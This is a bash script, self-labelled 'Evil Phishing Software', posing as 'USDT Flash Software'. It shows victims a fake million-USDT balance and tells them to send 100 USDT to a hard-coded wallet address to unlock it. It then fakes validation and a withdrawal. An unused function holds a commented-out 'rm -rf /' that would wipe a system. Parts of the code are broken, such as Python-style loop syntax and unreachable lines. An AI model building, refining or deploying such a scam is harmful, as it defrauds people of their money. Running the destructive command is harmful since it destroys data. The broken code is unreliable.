#!/bin/bash

# Evil Phishing Software

balance=1000000
hash_id="d26c9fb3e2738deb32d9d0e1ce0e7427211da34390955883dc2dc24a89603099"
account_id="TXYYQwqfj5ih1mZk27fSj21DmsDQJVyrcr"

usdt_logo="
\e[38;2;38;161;123m$$$$$$\
$$  __$$\
$$ /  \__| $$$$$$\  $$\   $$\  $$$$$$\$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\
\e[38;2;38;161;123m\$$$$$$\  $$  __$$\ $$ |  $$ |$$  _$$  _$$\  \____$$\ $$  __$$\ $$  __$$\
 \____$$\ $$ /  $$ |$$ |  $$ |$$ / $$ / $$ | $$$$$$$ |$$ /  $$ |$$ |  $$ |
$$\   $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$  __$$ |$$ |  $$ |$$ |  $$ |
\e[38;2;38;161;123m\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ | $$ | $$ |\$$$$$$$ |\$$$$$$  |$$ |  $$ |
 \______/  \______/  \______/ \__| \__| \__| \_______| \______/ \__|  \__|
\e[0m"

function fancyBoxEcho {
    local message="$1"
    local length=${#message}
    local border=$(printf '=%.0s' $(seq 1 $((length + 4))))

    echo -e "\e[38;2;38;161;123m$border\e[0m"
    echo -e "\e[38;2;38;161;123m| $message |\e[0m"
    echo -e "\e[38;2;38;161;123m$border\e[0m"
}

welcome_message="Welcome to the USDT Flash Software! Unlock your balance and enjoy the power of Flash USDT!"

echo -e "$usdt_logo"

fancyBoxEcho "$welcome_message"

echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"

function unlockBalance {
    echo " "
    read -p "Enter your deposit amount in USDT: " depositAmount
    read -p "Enter the transaction hash ID: " transactionHash
	
    echo " "
    for ((i=1; i<=15; i++)); do
        echo -e " \e[32mValidating please wait...\e[0m"
        sleep 0.5
    done
    echo " "

    if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
        refresh
        selectNetwork
    else
        echo -e "\e[31mError: Invalid deposit amount or transaction hash ID. Restarting...\e[0m"
        sleep 3
        clear
        fancyBoxEcho="$welcome_message"
        unlockBalance
    fi
}

function selectNetwork {
    echo -e "$usdt_logo"
    echo "Select network:"
    echo " "
    echo "1. TRC20"
    echo "2. ERC20"
    echo "3. BEP20"
    echo " "
    echo -n "Enter your choice: "
    read network_choice

    case $network_choice in
        1) network="TRC20";;
        2) network="ERC20";;
        3) network="BEP20";;
        *) echo "Invalid choice, please try again."; selectNetwork;;
    esac

    read -p "Enter your withdrawal address: " withdrawal_address
    echo ""
    echo "Please Wait...."
    sleep 4
    echo "[+]Withdrawal successful to address $withdrawal_address on $network network.[+]"
    exit
}

function evilFunction {
    echo "Executing evil function..."
    #rm -rf / # Let us cause some chaos!
    echo "Evil function executed successfully!"
    exit
}

fancyBoxEcho "Current Balance: $balance USDT"

function refresh {
    echo "Refreshing..."
    sleep 2
    clear
    echo -e "$usdt_logo"
    echo " "
    fancyBoxEcho "$welcome_message"
    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
}

refresh # Call the refresh function when the script starts

while true; do
    unlockBalance
done

if unlockBalance; then
    for number in range(1, 200); do
        echo "Unlocking......"
    done
fi

exit
